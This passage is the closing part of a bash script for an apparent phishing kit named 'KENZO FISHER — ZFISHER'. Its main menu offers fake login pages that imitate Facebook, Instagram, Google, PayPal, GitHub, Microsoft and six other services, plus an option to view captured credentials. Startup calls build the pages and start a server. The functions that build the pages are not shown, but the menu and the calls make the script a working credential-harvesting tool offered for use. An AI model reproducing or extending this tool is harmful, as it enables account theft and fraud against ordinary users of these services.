    read -p $'\e[1;33mPress ENTER to go back...\e[0m'
}

#-------- Main menu --------
main_menu() {
    while true; do
        banner
        echo -e "${R}       ╔════════════════════════════════════╗${NC}"
        echo -e "${R}       ║${Y}     ⚠ KENZO FISHER — ZFISHER ⚠${R}     ║${NC}"
        echo -e "${R}       ╠════════════════════════════════════╣${NC}"
        echo -e "${R}       ║${NC}  ${G}[01]${NC} Facebook                     ${R}║${NC}"
        echo -e "${R}       ║${NC}  ${G}[02]${NC} Instagram                    ${R}║${NC}"
        echo -e "${R}       ║${NC}  ${G}[03]${NC} Google                       ${R}║${NC}"
        echo -e "${R}       ║${NC}  ${G}[04]${NC} Twitter / X                  ${R}║${NC}"
        echo -e "${R}       ║${NC}  ${G}[05]${NC} LinkedIn                     ${R}║${NC}"
        echo -e "${R}       ║${NC}  ${G}[06]${NC} Netflix                      ${R}║${NC}"
        echo -e "${R}       ║${NC}  ${G}[07]${NC} Microsoft                    ${R}║${NC}"
        echo -e "${R}       ║${NC}  ${G}[08]${NC} GitHub                       ${R}║${NC}"
        echo -e "${R}       ║${NC}  ${G}[09]${NC} PayPal                       ${R}║${NC}"
        echo -e "${R}       ║${NC}  ${G}[10]${NC} WhatsApp                     ${R}║${NC}"
        echo -e "${R}       ║${NC}  ${G}[11]${NC} Amazon                       ${R}║${NC}"
        echo -e "${R}       ║${NC}  ${G}[12]${NC} Spotify                      ${R}║${NC}"
        echo -e "${R}       ╠════════════════════════════════════╣${NC}"
        echo -e "${R}       ║${NC}  ${G}[13]${NC} View Captured Creds          ${R}║${NC}"
        echo -e "${R}       ║${NC}  ${G}[14]${NC} Rebuild All Pages            ${R}║${NC}"
        echo -e "${R}       ║${NC}  ${G}[00]${NC} Exit                         ${R}║${NC}"
        echo -e "${R}       ╚════════════════════════════════════╝${NC}"
        echo ""
        read -p $'\e[1;33m[?] KENZO FISHER — Select [00-14]: \e[0m' opt

        case $opt in
            1|01) start_phish "facebook" ;;
            2|02) start_phish "instagram" ;;
            3|03) start_phish "google" ;;
            4|04) start_phish "twitter" ;;
            5|05) start_phish "linkedin" ;;
            6|06) start_phish "netflix" ;;
            7|07) start_phish "microsoft" ;;
            8|08) start_phish "github" ;;
            9|09) start_phish "paypal" ;;
            10) start_phish "whatsapp" ;;
            11) start_phish "amazon" ;;
            12) start_phish "spotify" ;;
            13) view_captures ;;
            14)
                setup_dirs
                create_all_pages
                echo -e "${G}[✔] Pages rebuilt!${NC}"
                sleep 1
                ;;
            0|00)
                stop_server
                echo -e "${R}[!] KENZO FISHER signing off...${NC}"
                exit 0
                ;;
            *)
                echo -e "${R}[-] Invalid option!${NC}"
                sleep 1
                ;;
        esac
    done
}

#-------- Trap Ctrl+C --------
trap 'echo -e "\n${Y}[*] Stopping...${NC}"; stop_server; main_menu' INT

#-------- Start --------
setup_dirs
check_deps
create_all_pages
main_menu
